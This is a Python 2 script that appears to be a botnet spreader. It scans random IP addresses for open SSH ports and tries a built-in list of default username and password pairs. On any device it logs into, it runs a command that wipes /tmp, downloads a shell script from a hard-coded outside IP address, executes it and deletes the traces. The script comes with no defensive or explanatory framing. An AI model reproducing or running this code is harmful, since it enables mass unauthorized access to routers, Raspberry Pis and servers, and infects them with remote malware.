#!/usr/bin/env python

import threading, paramiko, random, socket, time, sys, re, os

if len(sys.argv) < 4:
	sys.exit("\033[37mUsage: python "+sys.argv[0]+" <Threads> <Flag> <Range> <1/2/perl> ")

paramiko.util.log_to_file("/dev/null")

reservedips = [
 'http://127'
]

passwords = [ # perls/la
    "root:root",
    "root:admin",
    "admin:admin",
    "ubnt:ubnt"
    "root:1234",
    "admin:1234",
    "guest:guest",
    "user:user",
    "test:test",
    "pi:raspberry",
    "vagrant:vagrant",
    "root:maxided",
]

print 'Scanning started!!'

if sys.argv[4] == '1':
    passwords = [ "root:maxided", "root:root", "root:1234", "ubnt:ubnt", "ubnt:1234", "admin:admin", "admin:1234", "admin:password", "root:password", "system:system", "administrator:administrator", "guest:guest", "test:test" ] #Slow but effective
if sys.argv[4] == '2':
    passwords = [ "root:root", "admin:admin" ] #Fast but yet less effective
if sys.argv[4] == 'perl':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ] #perl scanner
if sys.argv[4] == 'ubnt':
    passwords = [ "ubnt:ubnt", "ubnt:1234", "ubnt:password" ] #ubnt scanner
if sys.argv[4] == 'root':
    passwords = [ "root:root" ] #root scanner

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ''+ip1+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))
                    elif ipclassinfo == "B":
                        self.host = ''+ip1+'.'+ip2+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))
                    elif ipclassinfo == "C":
                        self.host = ''+ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
			lucky = ["201.13","197.23","187.89","37.236","191.53","161.18","191.53","186.208","1.0","177.137","177.38","101.108","125.27","177.44","179.189","179.97"]
                        self.host = 'http://'+random.choice(lucky)+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))
                    else:
                        self.host = 'http://'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))+'.'+str(random.randrange(0,500))
                    for badip in reservedips:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                self.host=self.host.replace('http://', '')
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
			ssh.connect(self.host, port = port, username=username, password=password, timeout=5)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                websites = [ ]			
                if badserver == False:
                        print 'Executing| '+username+'|'+password+':'+self.host+'|'+str(port)
			ssh.exec_command("cd /tmp; rm -rf *; wget -q http://208.67.1.176/cocks.sh; chmod +x cocks.sh; sh cocks.sh; rm -f *")
			ssh.close()
            except:
                pass

for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass